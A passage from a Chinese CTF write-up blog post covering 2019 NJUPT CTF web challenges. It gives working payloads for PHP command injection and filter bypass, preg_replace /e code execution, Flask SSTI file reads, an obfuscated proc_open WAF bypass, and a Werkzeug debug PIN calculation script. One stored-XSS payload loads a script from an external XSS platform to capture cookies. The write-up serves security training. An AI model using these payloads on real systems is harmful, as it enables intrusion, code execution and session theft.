class="string">"------------------md5("</span>+str(i)+<span class="string">")="</span>+j</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>爆破结果：2120624</p>
<p><img src="../../../../img/njupt/19.png" alt=""></p>
<p>传入payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=23333%0a&amp;str1=2120624&amp;str2=240610708</span><br></pre></td></tr></table></figure>

<h4 id="第三层过滤"><a href="#第三层过滤" class="headerlink" title="第三层过滤"></a>第三层过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$_GET[&#39;q_w_q&#39;]</code>长度小于等于8，并且<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>检测不能包含下划线<code>_</code></p>
<p>参考：<a href="https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c</a> </p>
<p>php传入的变量名中如果有点号<code>.</code>，会被自动转化成下划线<code>_</code></p>
<p>然后就是命令过滤了<code>ls</code>，可以用<code>dir</code>列目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=dir%20./</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/21.png" alt=""></p>
<p><strong>flllag.php</strong>在当前目录下，可以用<code>head</code>读取，但是直接输入flllag.php会超出长度限制，于是想到用文件通配符<code>*</code></p>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=head%20f*</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/22.png" alt=""></p>
<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>打开靶机，是一个文字替换功能的页面：</p>
<p><img src="../../../../img/njupt/23.png" alt=""></p>
<p>hint.php</p>
<p><img src="../../../../img/njupt/24.png" alt=""></p>
<p>php5.6版本，于是就想到了<strong>preg_replace</strong>在<code>/e</code>模式下的命令执行</p>
<p>尝试在<code>pat</code>参数：<code>test/e</code>，但是出现了报错，截断<code>test/e%00</code>也出现了报错，后面直接尝试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=test&amp;pat=test&amp;rep=phpinfo()</span><br></pre></td></tr></table></figure>

<p>发现就执行了，原来源码中就直接带有模式<code>/e</code></p>
<p><img src="../../../../img/njupt/25.png" alt=""></p>
<p>然后过滤了<strong>引号</strong>，用<code>chr</code>函数表示字符</p>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=test&amp;pat=test&amp;rep=show_source(chr(47).chr(102).chr(108).chr(97).chr(103));</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/26.png" alt=""></p>
<h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p>打开靶机，是flask写的实现加密功能的网站</p>
<p><img src="../../../../img/njupt/27.png" alt=""></p>
<p>在md5加密和base64加密的参数中尝试ssti失败</p>
<p>访问sha256</p>
<p><img src="../../../../img/njupt/28.png" alt=""></p>
<p>发现返回了网址，尝试修改<strong>路由</strong>：123</p>
<p><img src="../../../../img/njupt/29.png" alt=""></p>
<p>发现直接回显，测试ssti，存在</p>
<p><img src="../../../../img/njupt/30.png" alt=""></p>
<p>然后就是直接一把梭读取/flag文件了，不过有过滤<code>flag</code>关键字，用字符串拼接方法即可绕过，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[40](&apos;/fla&apos;+&apos;g&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/31.png" alt=""></p>
<h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>打开靶机，源码发现了参数<code>index.php?action=</code>，存在任意文件包含</p>
<p><img src="../../../../img/njupt/32.png" alt=""></p>
<p>直接包含不到flag，需要上传点，在imgs.html找到上传点</p>
<p><img src="../../../../img/njupt/33.png" alt=""></p>
<p>老套路修改上传得到路径，在包含得到flag</p>
<p><img src="../../../../img/njupt/34.png" alt=""></p>
<h3 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h3><p> 随便注册个账号，有个留言功能：</p>
<p><img src="../../../../img/njupt/35.png" alt=""></p>
<p>测试发现只有长度的限制，其他没有过滤，直接反弹到xss平台上接收：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://xss.pt/VKeu&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/36.png" alt=""></p>
<p>替换cookie得到flag：</p>
<p><img src="../../../../img/njupt/37.png" alt=""></p>
<h3 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'useful'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$usrful = $_GET[<span class="string">'useful'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    $dangerous = get_defined_functions();</span><br><span class="line">    array_push($dangerous[<span class="string">"internal"</span>], <span class="string">'eval'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($dangerous[<span class="string">"internal"</span>] <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($a,$bad) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($usrful))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf($code))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"oh,不能输入这些函数哦 :) "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>inctf PHP1.0的变形，加上过滤了<code>eval</code>和<code>assert</code>函数</p>
<p>执行phpinfo：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.h.p.i.n.f.o;$a();</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/38.png" alt=""></p>
<p>跟inctf一样，没有禁用<code>proc_open</code>函数，直接按之前的做法，执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open(&quot;/readFlag&gt;/tmp/hhx&quot;,array(),$z);</span><br></pre></td></tr></table></figure>

<p>直接之前的payload来打就行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.f.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.%20(%d0^%ff).h.h.x,array(),$z);</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/njupt/40.png" alt=""></p>
<h3 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h3><p>打开靶机，有一个urllib的ssrf，能读取任意文件，有回显</p>
<p><img src="../../../../img/njupt/41.png" alt=""></p>
<p>但是直接读不到flag，并且扫了一下内网没有其他服务开放</p>
<p>另外还有一个flask运行错误的debug界面</p>
<p><img src="../../../../img/njupt/42.png" alt=""></p>
<p>看一下/app/QWQ.py源码</p>
<p><img src="../../../../img/njupt/43.png" alt=""></p>
<p>因为没有模板文件<strong>contact.html</strong>不存在，才产生了报错</p>
<p>既然出题人故意给我们debug界面，我们就可以尝试进入调试</p>
<p><img src="../../../../img/njupt/44.png" alt=""></p>
<p>但是要进入调试需要输入验证的PIN码</p>
<p>搜了一下，有个利用SSRF爆破flask PIN码的漏洞，参考：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553</a></p>
<p>需要的参数如下：</p>
<ul>
<li>username 通过<strong>/etc/passwd</strong>获取</li>
<li>flask目录下<strong>app.py</strong>的绝对路径 ，通过debug界面爆破的路径就可以知道</li>
<li>machine-id 通过<strong>/etc/machine-id</strong>或者<strong>/proc/sys/kernel/random/boot_id</strong>获取，当<strong>/etc/machine-id</strong>为空时该参数为空，如不存在，则为<strong>/proc/sys/kernel/random/boot_id</strong>中的值</li>
<li>mac地址 通过<strong>/sys/class/net/ens0/address</strong>获取</li>
</ul>
<p>依次读取参数后，套入爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">	<span class="string">'ctf'</span>,<span class="comment"># username</span></span><br><span class="line">	<span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">	<span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">	<span class="string">'/usr/local/lib/python3.6/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">	<span class="string">'2485378220034'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">	<span class="string">'21e83dfd-206c-4e80-86be-e8d0afc467a1'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">		bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">	h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">	h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">	num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">	<span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">			rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">						  <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>获取到PIN码：186-452-081</p>
<p>但是输入题目环境发现不对，卡了很久</p>
<p>后面去看了一下flask的获取pin的源码部分：<strong>/usr/local/lib/python3.6/site-packages/werkzeug/debug/<strong>init</strong>.py</strong></p>
<p><img src="../../../../img/njupt/45.png" alt=""></p>
<p>发现读取machine-id的文件其实是<strong>/proc/self/cgroup</strong>这个文件</p>
<p><img src="../../../../img/njupt/46.png" alt=""></p>
<p>将脚本中的machine-id修改为：<strong>615e9ef0fb7593034c948b6ec0b5d22627cf79ccb1c404fc560ad5af1751bd08</strong></p>
<p>再次运行得到PIN码：<strong>442-392-767</strong></p>
<p>输入后成功进入调试，最后getflag</p>
<p><img src="../../../../img/njupt/47.png" alt=""></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/">https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/26/D%5E3ctf-Web/"><i class="fa fa-chevron-left">  </i><span>2019 D^3 CTF-Web部分复现记录</span></a></div><div class="next-post pull-right"><a href="/2019/11/21/EIS2019-wp/"><span>2019 EIS Web部分题解WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>